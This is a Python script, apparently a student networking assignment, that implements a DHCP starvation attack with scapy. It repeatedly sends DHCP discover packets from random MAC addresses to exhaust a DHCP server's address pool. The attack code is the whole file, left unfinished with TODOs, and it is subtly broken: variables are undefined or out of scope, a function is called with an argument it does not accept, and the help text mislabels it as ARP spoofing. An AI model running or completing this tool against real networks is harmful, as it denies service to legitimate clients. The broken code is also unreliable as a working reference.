# Ariel Bar Kalifa 214181604
# Yedidya Marashe 213661499


import argparse
from itertools import count
import random
import re
from urllib import response
from scapy.all import *
import progress

IP_REGEX = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"   
count = 0


def validate_ip_address(address):
    """
    Validate an ip address for argparse constraint matching.
    """
    if re.match(IP_REGEX, address):
        return address
    raise argparse.ArgumentTypeError('invalid value for ip argument (src or target)')

def ganerate_mac_address():
    return ("%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        ))

def starv():
    #TODO:
    #make a while loop that will do a dhcp request with a random mac address
    #the ip src in the dhcp request will be the 0.0.0.0 and the ip dst will be the target(or broadcast)
    #will take all the available ip addresses
    #if the -p check is true, will save clock for every ip address and will renew the
    #dhcp request 5 seconds before the end of the clock
    target = "255.255.255.255"
    if(args.target):
        target = args.target
        
    dhcp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst=target)/UDP(sport=68,dport=67)/BOOTP(op=1)/DHCP(options=[('message-type','discover'),('end')])
    while True: #meybe do change the while loop till we get the dhcp server full 
        #send to other function with other proceses
        p = Process(target=sendPacket, args=(dhcp_request,))
        p.start()
        p.join()

        print(count)        
        

        
        #need to send the dhcp request to the target
    
def sendPacket(dhcp_request):
    mac = ganerate_mac_address()
    dhcp_request.src = mac
    response = sr1(dhcp_request, iface=args.iface)
    if response:
        dhcp_request.dst = response.src
        #dhcp_request.options =[('message-type','request'),('requested_addr',response.getlayer(BOOTP).yiaddr),('server_id',response.getlayer(BOOTP).siaddr),('end')]

        response = sr1(dhcp_request, iface=args.iface)
        if response:
            count += 1
    #TODO:
    #check how we get the clock for the dhcp request
    #if the -p check is true, will save clock for every ip address and will renew the
    
    #if(args.persist):
        #time.sleep(5)


def main():
    # initialize argument parser for command line
    parser = argparse.ArgumentParser(description="Spoof ARP tables")
    parser.add_argument("-i","--iface", help="Interface you wish to use", choices=get_if_list())
    parser.add_argument("-p","--persist", help="Renew the attack if about to end", choices=get_if_list())
    parser.add_argument("-t","--target", help="IP of target", type=validate_ip_address, required=True)
    
    args = parser.parse_args()
    starv(vars(args))


if __name__ == "__main__":
    main()                                                                     
        